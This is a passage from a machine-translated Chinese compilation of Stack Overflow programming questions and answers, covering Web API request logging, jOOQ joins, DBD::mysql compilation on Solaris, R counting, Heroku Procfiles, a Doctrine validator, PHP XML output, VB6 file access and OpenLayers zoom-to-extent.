            Logger.Info("{4:yyyy-MM-dd HH:mm:ss} {5} {0} request [{1}]{2} - {3}", request.GetCorrelationId(), request.Method, request.RequestUri, x.Result, DateTime.Now, Username(request));
        });
    }

    private void LogResponse(HttpResponseMessage response)
    {
        var request = response.RequestMessage;
        (response.Content ?? new StringContent("")).ReadAsStringAsync().ContinueWith(x =>
        {
            Logger.Info("{3:yyyy-MM-dd HH:mm:ss} {4} {0} response [{1}] - {2}", request.GetCorrelationId(), response.StatusCode, x.Result, DateTime.Now, Username(request));
        });
    }

    private string Username(HttpRequestMessage request)
    {
        var values = new List<string>().AsEnumerable();
        if (request.Headers.TryGetValues("my-custom-header-for-current-user", out values) == false) return "<anonymous>";

        return values.First(); 
    }
} 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-10-19T22:46:21.460

我想你会有兴趣看看 Web API 跟踪[http://www.asp.net/web-api/overview/testing-and-debugging/tracing-in-aspnet-web-api](http://www.asp.net/web-api/overview/testing-and-debugging/tracing-in-aspnet-web-api)。它允许您查看 Web API 的内部机制。

就您而言，我假设您对动作的输入和输出特别感兴趣。因此，您可以像以下示例一样对 TraceWriter 进行过滤以过滤掉冗余信息：

```
public class ActionAuditor : ITraceWriter
{
    private const string TargetOperation = "ExecuteAsync";
    private const string TargetOpeartor = "ReflectedHttpActionDescriptor";

    public void Trace(HttpRequestMessage request, string category, TraceLevel level, Action<TraceRecord> traceAction)
    {
        var rec = new TraceRecord(request, category, level);
        traceAction(rec);

        if (rec.Operation == TargetOperation && rec.Operator == TargetOpeartor)
        {
            if (rec.Kind == TraceKind.Begin)
            {
                // log the input of the action
            }
            else
            {
                // log the output of the action
            }
        }
    }
} 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2016-09-17T05:50:28.717

我研究了一个库，它允许您使用操作过滤器记录与 ASP.NET Web API 控制器的交互。

它可以记录带有调用者信息、参数、输出、持续时间、异常等的操作方法调用。

看看[Audit.WebApi](https://github.com/thepirat000/Audit.NET/tree/master/src/Audit.WebApi#auditwebapi)。

您可以使用以下命令快速创建使用此库的示例项目：

```
> dotnet new -i Audit.WebApi.Template
> dotnet new webapiaudit 
```

# sql - 如何从数据库中获取两种不同的记录类型？

> ID：12300459
> 
> 赞同：4
> 
> 时间：2012-09-06T12:46:12.607
> 
> 标签：sql, jooq

我有两个具有 FK 关系的表。我想要的相当于：

```
select A.*, B.*
from A
join B
    on B.A_ID = A.ID 
```

我如何在[jOOQ](http://www.jooq.org/)中有效地做到这一点？最后，我需要每个结果行的一个实例`ARecord`和一个。`BRecord`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T18:45:03.447

像这样

```
Result<Record> result =
create.select()
      .from(A)
      .join(B).on(B.A_ID.equal(A.ID))
      .fetch(); 
```

这将获取`A.*, B.*`（或更准确地说，`A.A1, A.A2, ..., A.AN, B.B1, ...`）。现在为了转化`result`为使用方法：`ARecord``BRecord`[`Result.into(Table)`](http://www.jooq.org/javadoc/latest/org/jooq/Result.html#into%28org.jooq.Table%29)

```
ARecord a = result.into(A);
BRecord b = result.into(B); 
```

请注意，这有已知的缺陷。例如，如果`A.X`是一个具有相应字段`B.X`（相同字段名称）的字段，`A.X`则将保存`B.X`' 值。我为此注册了一个错误报告：[#1802](https://github.com/jOOQ/jOOQ/issues/1802)

# appharbor - 多次重命名 AppHarbor 应用程序？

> ID：12300463
> 
> 赞同：0
> 
> 时间：2012-09-06T12:46:23.603
> 
> 标签：appharbor

AppHarbor 应用程序可以多次重命名吗？

我添加了一个新项目，然后成功重命名它。现在我想再次重命名它，并且更改根本不会坚持。更改名称并单击应用程序设置中的更新应用程序按钮后，它会显示一条消息，说明设置已更新但名称未更改。

我在做傻事吗？（除了不能决定名字！）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T00:16:39.277

非常抱歉，这是我昨天介绍的一个错误。它应该在您阅读本文时修复。

# perl - 在 SunOS 5.10 上编译 DBD::mysql

> ID：12300465
> 
> 赞同：1
> 
> 时间：2012-09-06T12:46:36.167
> 
> 标签：perl, solaris, perl-module, dbd, sunos

大家

对于这篇文章的篇幅过长，我深表歉意。
我在 SunOS 上编译 DBD::mysql 时遇到一些问题。

```
# /usr/perl5/bin/perlgcc Makefile.PL

I will use the following settings for compiling and testing:

  cflags        (mysql_config) = -I/usr/sfw/include/mysql -xstrconst -mt
  embedded      (mysql_config) = 
  ldflags       (mysql_config) = -R/usr/sfw/lib -R/usr/sfw/lib/mysql
  libs          (mysql_config) = -L/usr/sfw/lib -L/usr/sfw/lib/mysql -lmysqlclient -lz -lposix4 -lcrypt -lgen -lsocket -lnsl -lm
  mysql_config  (guessed     ) = mysql_config
  nocatchstderr (default     ) = 0
  nofoundrows   (default     ) = 0
  ssl           (guessed     ) = 0
  testdb        (default     ) = test
  testhost      (default     ) = 
  testpassword  (default     ) = 
  testsocket    (default     ) = 
  testuser      (guessed     ) = 

Checking if your kit is complete...
Looks good
Using DBI 1.58 (for perl 5.008004 on sun4-solaris-64int) installed in /usr/perl5/vendor_perl/5.8.4/sun4-solaris-64int/auto/DBI/
Writing Makefile for DBD::mysql

# /usr/sfw/bin/gmake
cp lib/DBD/mysql.pm blib/lib/DBD/mysql.pm
cp lib/DBD/mysql/GetInfo.pm blib/lib/DBD/mysql/GetInfo.pm
cp lib/DBD/mysql/INSTALL.pod blib/lib/DBD/mysql/INSTALL.pod
cp lib/Bundle/DBD/mysql.pm blib/lib/Bundle/DBD/mysql.pm
gcc -c  -I/usr/perl5/vendor_perl/5.8.4/sun4-solaris-64int/auto/DBI -I/usr/sfw/include/mysql -xstrconst -mt -DDBD_MYSQL_INSERT_ID_IS_GOOD -g  -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 -D_TS_ERRNO -O2 -fno-strict-aliasing   -DVERSION=\"4.022\" -DXS_VERSION=\"4.022\" -fPIC "-I/usr/perl5/5.8.4/lib/sun4-solaris-64int/CORE"   dbdimp.c
gcc: language strconst not recognized
gcc: dbdimp.c: linker input file unused because linking not done
/usr/perl5/5.8.4/bin/perl -p -e "s/~DRIVER~/mysql/g" /usr/perl5/vendor_perl/5.8.4/sun4-solaris-64int/auto/DBI/Driver.xst > mysql.xsi
/usr/perl5/5.8.4/bin/perl /usr/perl5/5.8.4/lib/ExtUtils/xsubpp  -typemap /usr/perl5/5.8.4/lib/ExtUtils/typemap  mysql.xs > mysql.xsc && mv mysql.xsc mysql.c
Warning: duplicate function definition 'do' detected in mysql.xs, line 242
Warning: duplicate function definition 'rows' detected in mysql.xs, line 752
gcc -c  -I/usr/perl5/vendor_perl/5.8.4/sun4-solaris-64int/auto/DBI -I/usr/sfw/include/mysql -xstrconst -mt -DDBD_MYSQL_INSERT_ID_IS_GOOD -g  -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 -D_TS_ERRNO -O2 -fno-strict-aliasing   -DVERSION=\"4.022\" -DXS_VERSION=\"4.022\" -fPIC "-I/usr/perl5/5.8.4/lib/sun4-solaris-64int/CORE"   mysql.c
gcc: language strconst not recognized
gcc: mysql.c: linker input file unused because linking not done
Running Mkbootstrap for DBD::mysql ()
chmod 644 mysql.bs
rm -f blib/arch/auto/DBD/mysql/mysql.so
LD_RUN_PATH="/usr/sfw/lib:/usr/lib:/lib" /usr/perl5/5.8.4/bin/perl myld gcc  -G dbdimp.o mysql.o  -o blib/arch/auto/DBD/mysql/mysql.so   -L/usr/sfw/lib -L/usr/sfw/lib/mysql -lmysqlclient -lz -lposix4 -lcrypt -lgen -lsocket -lnsl -lm   
gcc: dbdimp.o: No such file or directory
gcc: mysql.o: No such file or directory
gmake: *** [blib/arch/auto/DBD/mysql/mysql.so] Error 1 
```

大概的相关资料：

```
mysql_config --cflags
-I/usr/sfw/include/mysql -xstrconst -mt

mysql_config --libs
-R/usr/sfw/lib -R/usr/sfw/lib/mysql -L/usr/sfw/lib -L/usr/sfw/lib/mysql -lmysqlclient -lz -lposix4 -lcrypt -lgen -lsocket -lnsl -lm

file `which perl`
/usr/bin/perl:  ELF 32-bit MSB executable SPARC Version 1, dynamically linked, stripped

# perl --version
This is perl, v5.8.4 built for sun4-solaris-64int

ldd /usr/sfw/bin/mysql
    libcurses.so.1 =>        /lib/libcurses.so.1
    libmysqlclient.so.12 =>  /usr/sfw/lib/libmysqlclient.so.12
    libz.so.1 =>                     /usr/lib/libz.so.1
    librt.so.1 =>                    /lib/librt.so.1
    libcrypt_i.so.1 =>       /usr/lib/libcrypt_i.so.1
    libgen.so.1 =>                   /lib/libgen.so.1
    libsocket.so.1 =>        /lib/libsocket.so.1
    libnsl.so.1 =>                   /lib/libnsl.so.1
    libm.so.2 =>                     /lib/libm.so.2
    libCstd.so.1 =>                  /usr/lib/libCstd.so.1
    libCrun.so.1 =>                  /usr/lib/libCrun.so.1
    libw.so.1 =>                     /lib/libw.so.1
    libthread.so.1 =>        /lib/libthread.so.1
    libc.so.1 =>                     /lib/libc.so.1
    libaio.so.1 =>                   /lib/libaio.so.1
    libmd.so.1 =>                    /lib/libmd.so.1
    libmp.so.2 =>                    /lib/libmp.so.2
    libscf.so.1 =>                   /lib/libscf.so.1
    libdoor.so.1 =>                  /lib/libdoor.so.1
    libuutil.so.1 =>         /lib/libuutil.so.1
    /usr/lib/cpu/sparcv8plus/libCstd_isa.so.1
    /platform/SUNW,SPARC-Enterprise-T5120/lib/libc_psr.so.1
    /platform/SUNW,SPARC-Enterprise-T5120/lib/libmd_psr.so.1

# perl -V
Summary of my perl5 (revision 5 version 8 subversion 4) configuration:
  Platform:
    osname=solaris, osvers=2.10, archname=sun4-solaris-64int
    uname='sunos localhost 5.10 sun4u sparc SUNW,Ultra-2'
    config_args=''
    hint=recommended, useposix=true, d_sigaction=define
    usethreads=undef use5005threads=undef useithreads=undef usemultiplicity=undef
    useperlio=define d_sfio=undef uselargefiles=define usesocks=undef
    use64bitint=define use64bitall=undef uselongdouble=undef
    usemymalloc=n, bincompat5005=undef
  Compiler:
    cc='cc', ccflags ='-D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 -xarch=v8 -D_TS_ERRNO',
    optimize='-xO3 -xspace -xildoff',
    cppflags=''
    ccversion='Sun WorkShop', gccversion='', gccosandvers=''
    intsize=4, longsize=4, ptrsize=4, doublesize=8, byteorder=87654321
    d_longlong=define, longlongsize=8, d_longdbl=define, longdblsize=16
    ivtype='long long', ivsize=8, nvtype='double', nvsize=8, Off_t='off_t', lseeksize=8
    alignbytes=8, prototype=define
  Linker and Libraries:
    ld='cc', ldflags =''
    libpth=/lib /usr/lib /usr/ccs/lib
    libs=-lsocket -lnsl -ldl -lm -lc
    perllibs=-lsocket -lnsl -ldl -lm -lc
    libc=/lib/libc.so, so=so, useshrplib=true, libperl=libperl.so
    gnulibc_version=''
  Dynamic Linking:
    dlsrc=dl_dlopen.xs, dlext=so, d_dlsymun=undef, ccdlflags='-R /usr/perl5/5.8.4/lib/sun4-solaris-64int/CORE'
    cccdlflags='-KPIC', lddlflags='-G'

Characteristics of this binary (from libperl): 
  Compile-time options: USE_64_BIT_INT USE_LARGE_FILES
  Locally applied patches:
        22667 The optree builder was looping when constructing the ops ...
        22715 Upgrade to FileCache 1.04
        22733 Missing copyright in the README.
        22746 fix a coredump caused by rv2gv not fully converting a PV ...
        22755 Fix 29149 - another UTF8 cache bug hit by substr.
        22774 [perl #28938] split could leave an array without ...
        22775 [perl #29127] scalar delete of empty slice returned garbage
        22776 [perl #28986] perl -e "open m" crashes Perl
        22777 add test for change #22776 ("open m" crashes Perl)
        22778 add test for change #22746 ([perl #29102] Crash on assign ...
        22781 [perl #29340] Bizarre copy of ARRAY make sure a pad op's ...
        22796 [perl #29346] Double warning for int(undef) and abs(undef) ...
        22818 BOM-marked and (BOMless) UTF-16 scripts not working
        22823 [perl #29581] glob() misses a lot of matches
        22827 Smoke [5.9.2] 22818 FAIL(F) MSWin32 WinXP/.Net SP1 (x86/1 cpu)
        22830 [perl #29637] Thread creation time is hypersensitive
        22831 improve hashing algorithm for ptr tables in perl_clone: ...
        22839 [perl #29790] Optimization busted: '@a = "b", sort @a' ...
        22850 [PATCH] 'perl -v' fails if local_patches contains code snippets
        22852 TEST needs to ignore SCM files
        22886 Pod::Find should ignore SCM files and dirs
        22888 Remove redundant %SIG assignments from FileCache
        23006 [perl #30509] use encoding and "eq" cause memory leak
        23074 Segfault using HTML::Entities
        23106 Numeric comparison operators mustn't compare addresses of ...
        23320 [perl #30066] Memory leak in nested shared data structures ...
        23321 [perl #31459] Bug in read()
        27722 perlio.c breaks on Solaris/gcc when > 256 FDs are available
        SPRINTF0 - fixes for sprintf formatting issues - CVE-2005-3962
        6663288 Upgrade to CGI.pm 3.33
        REGEXP0 - fix for UTF-8 recoding in regexps - CVE-2007-5116
        6758953 Perl Sys::Syslog can log messages with wrong severity
  Built under solaris
  Compiled at May 21 2009 03:59:02
  @INC:
    /usr/perl5/5.8.4/lib/sun4-solaris-64int
    /usr/perl5/5.8.4/lib
    /usr/perl5/site_perl/5.8.4/sun4-solaris-64int
    /usr/perl5/site_perl/5.8.4
    /usr/perl5/site_perl
    /usr/perl5/vendor_perl/5.8.4/sun4-solaris-64int
    /usr/perl5/vendor_perl/5.8.4
    /usr/perl5/vendor_perl
    .

isainfo -v
64-bit sparcv9 applications
        asi_blk_init vis2 vis 
32-bit sparc applications
        asi_blk_init vis2 vis v8plus div32 mul32 
```

如果可能的话，我应该如何一步一步地进行（对于傻瓜）的任何提示？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T14:06:09.137

尝试使用 Sun 编译器，它大概编译了您的 mysql。其他人也[有这个问题](http://bugs.mysql.com/bug.php?id=27945)。

# parsing - 用于 Scala 的 LALR(1) 解析器生成器

> ID：12300466
> 
> 赞同：4
> 
> 时间：2012-09-06T12:46:37.380
> 
> 标签：parsing, scala, lalr

我知道可以在 scala 项目中使用例如野牛生成的 Java 文件，但是是否有任何本机的“Scala 语法”LALR(1) 生成器？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-01-10T13:43:52.580

这里的另一个插件：[ScalaBison](http://www.cs.uwm.edu/~boyland/scala-bison.html)接近 LALR(1) 并允许您在操作中使用 Scala。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-09T01:04:04.090

我并没有真正回答最初的问题，请原谅插件，但您可能对我们[用于 sbt 工具的 sbt-rats 插件感兴趣](http://sbt-rats.googlecode.com)。它使用[老鼠！Java 的解析器生成器](http://cs.nyu.edu/rgrimm/xtc/rats-intro.html)，但更容易从 Scala 中使用。

老鼠！使用解析表达式语法作为其语法描述形式，而不是上下文无关语法，也绝对不是 LALR(1) 语法。sbt-rats 还具有高级语法定义语言，在大多数情况下，这意味着您无需编写语义操作即可获得表示输入的语法树。该插件将可选地为树表示生成案例类，并为树结构生成漂亮的打印机。

# iframe - 通过脚本更改 iframe 的宽度和高度

> ID：12300468
> 
> 赞同：0
> 
> 时间：2012-09-06T12:46:43.230
> 
> 标签：iframe

我正在从非安全 url 在 iframe 中打开一个安全 url。在此，当用户单击它时，有一个提交按钮 iframe 内容已更改，但 iframe 大小保持不变。但是，当我选择安全或非安全的所有 url 时，我可以使用其他一些功能调整内容的大小。

```
parent.$('fancybox-wrap').setStyle({'height':'700px'});
parent.$('fancybox-content').setStyle({'height':'690px'}); 
```

但是当我使用不同的 url（安全 iframe url 和非安全父 url）时，它会产生错误（权限被拒绝）。

任何人都可以告诉我有关此的任何想法吗？

# r - 我有一列有 1000 行。它有10个国家的名字。我怎么知道每个国家重复了多少次？

> ID：12300470
> 
> 赞同：-2
> 
> 时间：2012-09-06T12:46:47.880
> 
> 标签：r, count

我有一列有 1000 行。它有10个国家的名字。我如何计算每个国家重复了多少次？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-06T12:57:49.380

最具体的解决方案是使用`table`.

```
table(my.column) 
```

`summary`根据数据类型做不同的事情，但`table`总是显示每个唯一值的出现次数。例如，如果您使用 ID 号而不是字符串对国家/地区进行编码，`summary`则会显示四分位数，这不是您想要的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T12:52:15.087

如果您的国家名称被输入为您可以直接使用的因素`summary(my_data)`，否则`summary(as.factor(my_data))`。例如：

```
my_data <- sample(LETTERS[1:10], 1000, replace=TRUE)
summary(as.factor(my_data))
  A   B   C   D   E   F   G   H   I   J 
 99 111 106  89  90  90 109 105  96 105 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-06T12:48:40.203

您可以使用 summary(name_of_data_frame) 函数。例子：

```
fff<-c("d1","d1","d2")
f1<-data.frame(fff)
summary(f1) 
```

结果：fff
d1:2
d2:1

# heroku - 为什么即使我有正确的 Procfile，我也会得到“Procfile 声明类型 ->（无）”？

> ID：12300471
> 
> 赞同：0
> 
> 时间：2012-09-06T12:46:48.473
> 
> 标签：heroku, sunspot, foreman, cedar

我正在尝试通过将这一行添加到 Procfile 来运行 sunspot_solr gem 附带的捆绑 solr：

```
solr: bundle exec rake sunspot:solr:start 
```

**Procfile 用一个小“f”拼写，存在于我的 Rails 根目录中。**

我还不能让我的 Procfile 中提到的任何进程在 heroku 上运行。

我已经检查了 StackOverflow 上与同一主题相关的其他问题，所以不要指向我那里：

[Heroku中“Procfile声明类型->（无）”的原因是什么？](https://stackoverflow.com/questions/6346221/what-is-the-reason-for-procfile-declares-types-none-in-heroku)

[Procfile 在 Heroku 中声明类型 -> (none)](https://stackoverflow.com/questions/11537501/procfile-declares-types-none-in-heroku)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T13:58:10.147

通常 Heroku[需要至少一个`web`在 Procfile](https://devcenter.heroku.com/articles/procfile)中命名的进程：

> Cedar 堆栈上的所有语言和框架都声明了一个 Web 进程类型，它启动应用程序服务器。

如果您将 Procfile 改为这样说，您的程序是否会运行 -

`web: bundle exec rake sunspot:solr:start`

?

我不确定`Procfile declares types -> (none)`在推送之后仅仅看到是否意味着存在错误[——Heroku 的“Rails 入门”文章](https://devcenter.heroku.com/articles/rails3)在开始时也有该输出；他们只是稍后更改他们的 Procfile 来运行该`web`过程。

# php - Zend Framework 2 中的验证与 Doctrine 2

> ID：12300472
> 
> 赞同：3
> 
> 时间：2012-09-06T12:46:51.757
> 
> 标签：php, doctrine-orm, zend-framework2

我现在越来越熟悉 Zend Framework 2，同时我也在更新 Zend Framework 2 中的验证部分。我见过几个例子，如何使用 Zend Db 适配器验证数据库中的数据，例如来自 Zend Framework 2 官网的代码：

```
//Check that the username is not present in the database
$validator = new Zend\Validator\Db\NoRecordExists(
    array(
        'table' => 'users',
        'field' => 'username'
    )
);
if ($validator->isValid($username)) {
    // username appears to be valid
} else {
    // username is invalid; print the reason
    $messages = $validator->getMessages();
    foreach ($messages as $message) {
        echo "$message\n";
    }
} 
```

现在我的问题是如何进行验证部分？

例如，我需要在插入数据库之前验证名称以检查数据库中是否不存在相同的名称，我已经更新了 Zend Framework 2 示例专辑模块以使用 Doctrine 2 与数据库进行通信，现在我想将验证部分添加到我的代码中。

假设在将专辑名称添加到数据库之前，我想验证数据库中不存在相同的专辑名称。

任何有关此的信息都会非常有帮助！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-07T09:27:15.893

如果您使用 DoctrineModule，则[您的案例已经有一个验证器](https://github.com/doctrine/DoctrineModule/tree/master/src/DoctrineModule/Validator)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-06T13:59:19.850

我遇到了同样的问题并以这种方式解决了它：

1.  创建一个自定义验证器类，将其命名为`NoEntityExists`（或您想要的任何名称）。
2.  延长`Zend\Validator\AbstractValidator`
3.  为`Doctrine\ORM\EntityManager`
4.  为选项（实体名，...）提供一些额外的 getter 和 setter
5.  创建一个`isValid($value)`检查记录是否存在并返回布尔值的方法
6.  要使用它，请创建它的新实例，分配`EntityManager`并使用它，就像任何其他验证器一样。

要了解如何实现验证器类，请检查已经存在的验证器（最好是简单的类似`Callback`or `GreaterThan`）。

希望我能帮助你。

// 编辑：对不起，我迟到了 ;-)

所以这里有一个非常高级的例子，说明如何实现这样的验证器。

请注意，我添加了一个`translate()`方法以使用 PoEdit（一种翻译帮助工具，从源代码中获取此类字符串并将它们放入列表中）来捕获语言字符串。如果您不使用`gettext()`，则可能会跳过它。

此外，这是我第一次使用 ZF2 的课程之一，我不会再将它放入`Application`模块中。也许，例如创建一个更适合的新模块`MyDoctrineValidator`。

此验证器为您提供了很大的灵活性，因为您必须在使用之前设置查询。当然，您可以预先定义一个查询并在选项中设置实体、搜索列等。玩得开心！

```
<?php
namespace Application\Validator\Doctrine;

use Zend\Validator\AbstractValidator;
use Doctrine\ORM\EntityManager;

class NoEntityExists extends AbstractValidator
{
    const ENTITY_FOUND = 'entityFound';

    protected $messageTemplates = array();

    /**
     * @var EntityManager
     */
    protected $entityManager;

    /**
     * @param string
     */
    protected $query;

    /**
     * Determines if empty values (null, empty string) will <b>NOT</b> be included in the check.
     * Defaults to true
     * @var bool
     */
    protected $ignoreEmpty = true;

    /**
     * Dummy to catch messages with PoEdit...
     * @param string $msg
     * @return string
     */
    public function translate($msg)
    {
        return $msg;
    }

    /**
     * @return the $ignoreEmpty
     */
    public function getIgnoreEmpty()
    {
        return $this->ignoreEmpty;
    }

    /**
     * @param boolean $ignoreEmpty
     */
    public function setIgnoreEmpty($ignoreEmpty)
    {
        $this->ignoreEmpty = $ignoreEmpty;
        return $this;
    }

    /**
     *
     * @param unknown_type $entityManager
     * @param unknown_type $query
     */
    public function __construct($entityManager = null, $query = null, $options = null)
    {
        if(null !== $entityManager)
            $this->setEntityManager($entityManager);
        if(null !== $query)
            $this->setQuery($query);

        // Init messages
        $this->messageTemplates[self::ENTITY_FOUND] = $this->translate('There is already an entity with this value.');

        return parent::__construct($options);
    }

    /**
     *
     * @param EntityManager $entityManager
     * @return \Application\Validator\Doctrine\NoEntityExists
     */
    public function setEntityManager(EntityManager $entityManager)
    {
        $this->entityManager = $entityManager;
        return $this;
    }

    /**
     * @return the $query
     */
    public function getQuery()
    {
        return $this->query;
    }

    /**
     * @param field_type $query
     */
    public function setQuery($query)
    {
        $this->query = $query;
        return $this;
    }

    /**
     * @return \Doctrine\ORM\EntityManager
     */
    public function getEntityManager()
    {
        return $this->entityManager;
    }

    /**
     * (non-PHPdoc)
     * @see \Zend\Validator\ValidatorInterface::isValid()
     * @throws Exception\RuntimeException() in case EntityManager or query is missing
     */
    public function isValid($value)
    {
        // Fetch entityManager
        $em = $this->getEntityManager();

        if(null === $em)
            throw new Exception\RuntimeException(__METHOD__ . ' There is no entityManager set.');

        // Fetch query
        $query = $this->getQuery();

        if(null === $query)
            throw new Exception\RuntimeException(__METHOD__ . ' There is no query set.');

        // Ignore empty values?
        if((null === $value || '' === $value) && $this->getIgnoreEmpty())
            return true;

        $queryObj = $em->createQuery($query)->setMaxResults(1);

        $entitiesFound = !! count($queryObj->execute(array(':value' => $value)));

        // Set Error message
        if($entitiesFound)
            $this->error(self::ENTITY_FOUND);

        // Valid if no records are found -> result count is 0
        return ! $entitiesFound;
    }
} 
```

# php - 将现有数组添加到 3d 数组

> ID：12300474
> 
> 赞同：1
> 
> 时间：2012-09-06T12:46:53.050
> 
> 标签：php, arrays

我正在尝试构建一个 3d php 数组，最终以 xml 格式输出……这是我试图用来证明这个概念的代码……

```
$test = array('apple','orange');
$results = Array(
  'success' => '1',
  'error_number' => '',
  'error_message' => '',
  'results' => Array (
       'number_of_reports' => mysql_num_rows($run),
       'item' => $test
   )
); 
```

我希望得到的数组看起来像

```
<success>1</success>
<error_number/>
<error_message/>
<results>
     <number_of_reports>18</number_of_reports>
     <item>
         <0>apple</0>
         <1>orange</1>
     </item>
</results> 
```

实际上，苹果和橙色阵列本身就是一个 3d 阵列......如果你曾经使用过 ebay api......你就会知道我想要做什么（我认为）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T03:41:38.860

试试看：

代码：

```
<?php
$test = array('apple','orange');
$results = Array(
  'success' => '1',
  'error_number' => '',
  'error_message' => '',
  'results' => Array (
       'number_of_reports' => 1,
       'item' => $test
   )
);

print_r($results);
function addChild1($xml, $item, $clave)
{
    if(is_array($item)){
        $tempNode = $xml->addChild($clave,'');
        foreach ($item as $a => $b)
        {
            addChild1($tempNode, $b, $a);
        }           
    } else {
        $xml->addChild("$clave", "$item");
    }
}

$xml = new SimpleXMLElement('<root/>');
addChild1($xml, $results,'data');
$ret = $xml->asXML();

print $ret; 
```

输出：

```
<?xml version="1.0"?>
<root><data><success>1</success><error_number></error_number><error_message></error_message><results><number_of_reports>1</number_of_reports><item><0>apple</0><1>orange</1></item></results></data></root> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T12:52:58.157

请参阅下面的网址。我认为它对你很有用：-

[如何将数组转换为 SimpleXML](https://stackoverflow.com/questions/1397036/how-to-convert-array-to-simplexml)

**或试试看：-**

```
$xml = new SimpleXMLElement('<root/>');
array_walk_recursive($test_array, array ($xml, 'addChild'));
print $xml->asXML(); 
```

# ruby-on-rails-3 - Rails 控制台 - 输出查询结果表

> ID：12300476
> 
> 赞同：3
> 
> 时间：2012-09-06T12:47:04.123
> 
> 标签：ruby-on-rails-3, console

在 rails 控制台（仅用于记录，rails 3.2）上，如何使其输出到 STDOUT 我的查询结果表（即：包含列名称和值的表）？

```
User Load (6.5ms)  SELECT `users`.* FROM `users`
---------------------------
Id | Name | Address | Phone
---------------------------
1  | Sam  | ZZZ 10  | 55555
---------------------------
2  | xxxx | xxxxxxx | xxxxx 
```

谢！

ps：请注意，query.explain 不是我需要的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-15T21:44:13.617

我写了一个宝石来做到这一点！[http://tableprintgem.com](http://tableprintgem.com)

![table_print ruby​​ gem - 探索你的数据](../Images/aee8e9270696e821c6e207a78eb40568.png)

table_print 最强大的功能是能够在与之相关的其他对象的上下文中查看您的数据。您可以使用访问它们所需的方法链来引用嵌套对象。此示例显示来自三个不同表的数据：

*   **作者表中的名称**（通过 author.name 到达）
*   **Book 表中的标题**（通过 author.books.title 获得）
*   **照片表中的标题**（通过 author.books.photos.caption 获得）

![table_print ruby​​ gem - 将您的数据上下文化](../Images/b09bdbc4470394445a1a8b7416d1c021.png)

[在http://tableprintgem.com](http://tableprintgem.com)上有一个简短的介绍性截屏视频

# maven - 多模块 spring roo 项目设置

> ID：12300477
> 
> 赞同：0
> 
> 时间：2012-09-06T12:47:04.323
> 
> 标签：maven, spring-roo, multi-module

我对 Spring Roo 真的很陌生（可能已经使用了 2.5 个月），总的来说，这是一次非常好的体验，并且我很快创建了一个管理房地产投资组合的系统。

但是，该系统是在三个单独的 roo 项目中开发的：

物业管理 - mongo 后端

账户管理 - mongo 后端

地址簿 - JPA

现在我希望将它们组合在一个项目中，通过一个主页访问所有三个部分，我知道 roo 中包含 maven 多模块支持，但是当我尝试通过创建 Spring Roo 来组合这三个项目时多模块项目，定义三个模块，然后将三个模块中的每一个导入到各自的文件夹中，在部署时只设置了编译中要到达的第一个模块，并且 localhost 访问的路径不是多模块的名称项目，但编译的项目的名称..

有没有人知道任何资源或有任何关于从三个现有 webapp 的组合创建多模块 webapp 的提示？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T13:57:32.973

只需从这样的文件夹结构开始：

```
 root (pom.xml) Aggregator
  +-- mod-mongo-property
  +-- mod-mongo-accounts
  +-- mod-jpa 
```

将所有即将发布的东西，如依赖项和插件（特别是特定版本）移动到适当的父级（depenendencyManager、pluginManagement）。

# vb6 - 路径/文件访问错误

> ID：12300486
> 
> 赞同：1
> 
> 时间：2012-09-06T12:48:15.197
> 
> 标签：vb6

在下面的代码中，我在 Vb 6 中遇到路径/文件访问错误。

```
Open App.Path & "\testing.Bat" For Output as #1 
```

此错误仅发生在 Windows 7 PC 中，而不是始终发生，并且有时仅在此处涉及的任何病毒问题中发生？

任何人给我一个解决方案。请 ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T12:59:25.730

如果`App.Path`是`c:\Program Files`，则很可能是供股。在 Windows 7 上，即使您是管理员，您也并非始终拥有 Program Files 的完全权限。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-09-06T13:15:04.880

当您启动 Visual Studio 6.0 IDE 时，请确保您右键单击图标并选择“以管理员身份运行”而不是正常运行它，您也可以右键单击快捷方式图标，选择属性，然后在“兼容性”选项卡中，您应该能够选中“以管理员身份运行”，以便每次单击 Visual Basic 6.0 的快捷方式时，它将以管理员模式运行（并且可能每次都询问/提示您，在这种情况下，您必须选择是）。在这种情况下，文件/路径访问错误将消失 :)。

如果您需要更多帮助，请告诉我您的相处方式。

# openlayers - 如何根据 KML 数据计算地图中心？

> ID：12300495
> 
> 赞同：1
> 
> 时间：2012-09-06T12:48:41.170
> 
> 标签：openlayers, kml, center

所以，我使用 openlayers，有几个基础地图图层（google、bing、osm），我有一个 KML 图层，到处都有地标。计算地图中心和最佳缩放级别的最佳方法是什么？

谢谢！

kml 片段：

```
<Placemark>
    <name>foo</name>
    <description>
       foobar
    </description>
    <Point>
        <coordinates>lat,lon</coordinates>
    </Point>
</Placemark> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-10T14:34:46.247

如果您指的是包含 KML 图层中所有数据的范围：

```
map.zoomToExtent(KMLLayer.getDataExtent()); 
```

请参阅：[http ://dev.openlayers.org/docs/files/OpenLayers/Layer/Vector-js.html#OpenLayers.Layer.Vector.getDataExtent](http://dev.openlayers.org/docs/files/OpenLayers/Layer/Vector-js.html#OpenLayers.Layer.Vector.getDataExtent)

